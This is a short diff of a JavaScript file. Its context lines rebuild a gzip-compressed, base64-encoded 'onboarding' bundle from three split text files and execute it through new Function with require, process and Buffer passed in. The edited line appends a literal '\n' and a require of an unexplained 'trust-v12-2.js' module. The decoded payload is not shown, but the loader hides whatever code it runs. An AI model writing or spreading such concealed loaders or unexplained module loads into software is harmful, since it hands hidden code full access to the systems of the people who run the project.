@@ -13,4 +13,4 @@ const onboardingBundle=[1,2,3].map(i=>fs.readFileSync(`onboarding.v12.part${i}.t
 const onboardingSource=zlib.gunzipSync(Buffer.from(onboardingBundle,'base64')).toString('utf8');
 new Function('require','__dirname','__filename','process','Buffer',onboardingSource)(require,__dirname,__filename,process,Buffer);
 
-require('./speech-analytics-v11.js');
+require('./speech-analytics-v11.js');\nrequire('./trust-v12-2.js');
